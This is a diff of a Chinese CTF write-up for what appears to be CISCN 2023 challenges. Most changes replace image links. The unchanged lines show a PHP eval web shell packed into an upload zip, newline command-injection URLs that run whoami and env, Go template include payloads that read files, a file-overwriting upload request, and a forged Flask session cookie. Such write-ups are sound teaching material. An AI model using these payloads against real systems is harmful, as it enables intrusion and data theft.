@@ -30,19 +30,23 @@ echo "<?php @eval($_GET['cmd']);" > test/cmd.php
 zip -r test1.zip ./*
 ```
 上传解压后可访问test目录下的木马
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689256319986-8ffccc61-30f9-4469-a649-c24041c88a05.png#averageHue=%237e7d7d&clientId=ub1754b14-d6ff-4&from=paste&height=843&id=ua4d660b7&originHeight=843&originWidth=1291&originalType=binary&ratio=1&rotation=0&showTitle=false&size=96486&status=done&style=none&taskId=u0b213b80-c18b-4652-872f-37154eca2d1&title=&width=1291)
+
+![image-20230805011604202](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050116434.png)
+
 ### dumpit
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267210426-a2c9896f-5a67-4518-b377-51cf6fe710df.png#averageHue=%231f1f1f&clientId=ube04f257-9777-4&from=paste&id=u1d17d523&originHeight=442&originWidth=481&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=u200d73d2-6493-42c3-9822-a16fe7a2af8&title=)
+
+![image-20230805011822254](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118367.png)
 过滤的符号： 
 ![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267210383-74ce8b2b-5294-45e3-80f3-17a7b5f0294a.png#averageHue=%2334363a&clientId=ube04f257-9777-4&from=paste&id=u37519b8f&originHeight=224&originWidth=688&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=uda6bbae0-f7f9-4aa0-a5d9-bf35d3eedab&title=)
 /?db=bibin&table_2_dump=%00
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267210347-a2496d2e-3264-4620-b108-75754da933d5.png#averageHue=%23f1f0f0&clientId=ube04f257-9777-4&from=paste&id=uc2f09860&originHeight=191&originWidth=1864&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=u173c0853-edea-4592-a65d-d73246a42f5&title=)
+![image-20230805011833160](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118294.png)
 /?db=bibin&table_2_dump=%0a
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267210409-88d01087-8090-4f7b-ba42-534d37006b97.png#averageHue=%23e8e8e8&clientId=ube04f257-9777-4&from=paste&id=udb4598d9&originHeight=248&originWidth=1888&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=u2d7326ab-d3cb-4ecf-87a1-ad40a37a29b&title=)
+![image-20230805011846369](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118537.png)
 发现%0a闭合能执行命令，在env发现flag
 /?db=q&table_2_dump=%0awhoami%0a 
 /?db=q&table_2_dump=%0env%0a //环境变量
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267210856-609c0586-4edb-472d-ab0c-604324d514bc.png#averageHue=%23e3e3e3&clientId=ube04f257-9777-4&from=paste&id=u484038c4&originHeight=341&originWidth=1913&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=ua75c17ef-ae68-43f4-8821-fa989d3383c&title=)
+![image-20230805011910531](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119738.png)
+
 ### go_session
 [https://un1novvn.github.io/2023/05/29/ciscn2023/](https://un1novvn.github.io/2023/05/29/ciscn2023/)
 [https://ctf.njupt.edu.cn/archives/898#go_session](https://ctf.njupt.edu.cn/archives/898#go_session)
@@ -176,14 +180,15 @@ include可以读取文件，但不能直接传引号的字符串，需要一个�
 Context --> Request --> Host/Referer 可控
 
 报错获取app.py位置
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689258851364-7a9854e2-0980-4b86-a671-01568b97c4c4.png#averageHue=%23e1e1e1&clientId=ub1754b14-d6ff-4&from=paste&height=843&id=u34dee558&originHeight=843&originWidth=1291&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86838&status=done&style=none&taskId=udea54ddb-ee6e-4daf-a7ca-e9fa0a18ff4&title=&width=1291)
+![image-20230805011924762](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119943.png)
 读文件：
+
 ```python
 {%include c.Request.Referer()%}
 
 {%include c.Request.Host()%}
 ```
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689258789756-20b22129-4660-42e5-a32f-fcea14aad6e3.png#averageHue=%23f6f5f5&clientId=ub1754b14-d6ff-4&from=paste&height=793&id=pvPXr&originHeight=793&originWidth=1362&originalType=binary&ratio=1&rotation=0&showTitle=false&size=125372&status=done&style=none&taskId=u427028ae-befa-4c9c-ae8e-d7a21be25c9&title=&width=1362)
+![image-20230805011935987](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119165.png)
 
 Context --> 找到上传文件，`SaveUploadedFile(file *multipart.FileHeader,dst string)`，需要`FileHeader` --> `FormFile(name string)(*multipart.FileHeader,error)`
 需要两个可控变量，一个给dst，一个给name，用上面的Host和Referer
@@ -229,9 +234,10 @@ Content-Disposition: form-data; name="submit"
 
 ------WebKitFormBoundaryrxtSm5i2S6anueQi--
 ```
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689260138618-9d55044c-e710-4dc0-97b9-1b73a313cdf9.png#averageHue=%23f7f5f5&clientId=ub1754b14-d6ff-4&from=paste&height=793&id=u3c4467b9&originHeight=793&originWidth=1216&originalType=binary&ratio=1&rotation=0&showTitle=false&size=117259&status=done&style=none&taskId=u741e1c0d-a43d-48b8-9c37-06ec939df19&title=&width=1216)
+![image-20230805011955161](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119352.png)
 覆盖成功，执行命令
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689261099202-9fd14c4c-293d-4e96-ba09-5b6dce073883.png#averageHue=%23f8f7f7&clientId=ub1754b14-d6ff-4&from=paste&height=793&id=u68f037dc&originHeight=793&originWidth=1362&originalType=binary&ratio=1&rotation=0&showTitle=false&size=121870&status=done&style=none&taskId=u562d7e69-4132-4711-aa6d-18420a12337&title=&width=1362)
+![image-20230805012011004](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120195.png)
+
 ### DeserBug（java，之后再看
 [https://boogipop.com/2023/05/30/CISCN2023%E5%88%9D%E8%B5%9B%20Web%20WriteUp(%E5%90%AB%E5%A4%8D%E7%8E%B0)/#DeserBug-%E5%A4%8D%E7%8E%B0](https://boogipop.com/2023/05/30/CISCN2023%E5%88%9D%E8%B5%9B%20Web%20WriteUp(%E5%90%AB%E5%A4%8D%E7%8E%B0)/#DeserBug-%E5%A4%8D%E7%8E%B0)
 ### reading
@@ -358,7 +364,8 @@ python .\flask_session_cookie_manager3.py encode -s "9776436d6a1453cf13eceee8cda
 eyJrZXkiOiIxNjg5MjQ1NTAwMTAxNzMwOTAwIn0.ZK_Zsg.9oonOJJLBNz-XhXMQM9H7RCxo9Q
 ```
 访问/flag
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689246228109-92ab39b7-9a85-4d50-8b22-38a0c3925eca.png#averageHue=%236a7069&clientId=u1129387b-6829-4&from=paste&height=843&id=u8367fd51&originHeight=843&originWidth=1291&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75685&status=done&style=none&taskId=uc14a9b55-8fac-4453-8d69-042a37f2ecc&title=&width=1291)
+![image-20230805012025756](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120953.png)
+
 ### BackendService
 [https://mp.weixin.qq.com/s/2TDV2L-o1MlbYU0PSjb65Q](https://mp.weixin.qq.com/s/2TDV2L-o1MlbYU0PSjb65Q)
 [https://blog.csdn.net/Hoopy_Hoopy/article/details/120283270](https://blog.csdn.net/Hoopy_Hoopy/article/details/120283270)
@@ -369,8 +376,9 @@ nacos漏洞
 ## RE
 ### babyre
 [https://snap.berkeley.edu/snap/snap.html](https://snap.berkeley.edu/snap/snap.html)
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1685245383412-1d7a09e5-127b-4acb-a8f0-a97ae1fac3b6.png#averageHue=%23694d3b&clientId=u0b25a8a8-eb31-4&from=paste&height=648&id=ub3adca46&originHeight=972&originWidth=1915&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=707267&status=done&style=none&taskId=u1e4494b6-a6b5-4aa7-8de7-c3d2d8175e4&title=&width=1276.6666666666667)
+![image-20230805012033416](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120763.png)
 secret export
+
 ```
 102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30
 ```
@@ -385,8 +393,9 @@ print(flag)
 ```
 ## MISC
 ### 被加密的生产流量
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267575294-85403fb7-789f-4f47-9f91-78bfd00effe8.png#averageHue=%23faf8f7&clientId=ube04f257-9777-4&from=paste&height=607&id=u7b8adede&originHeight=902&originWidth=790&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=u59c490aa-8490-4a2d-93ef-80bb4d7ac00&title=&width=532)
+![image-20230805012051339](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120519.png)
 ![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267575256-79ed8b60-28bf-403f-b961-822fc170da8a.png#averageHue=%23fbfbfa&clientId=ube04f257-9777-4&from=paste&height=275&id=u6bc42ac5&originHeight=624&originWidth=1212&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=u4909d19d-b413-43c5-85ee-29b8519ea04&title=&width=534)
+
 ### pyshell
 python shell
 字符串长度为7
@@ -407,7 +416,8 @@ eval(_)
 ### 可信度量
 非预期：
 grep寻找flag，发现在proc/22/task/22/environ
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267436397-838772d1-941c-42a5-b7fb-f7012cfffcad.png#averageHue=%231c140f&clientId=ube04f257-9777-4&from=paste&id=uf7961128&originHeight=190&originWidth=1385&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=u94946fa3-3999-4b4e-8819-a602c13d926&title=)
+![image-20230805012110115](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050121257.png)
+
 ### Sign_in_passwd
 ```
 j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D
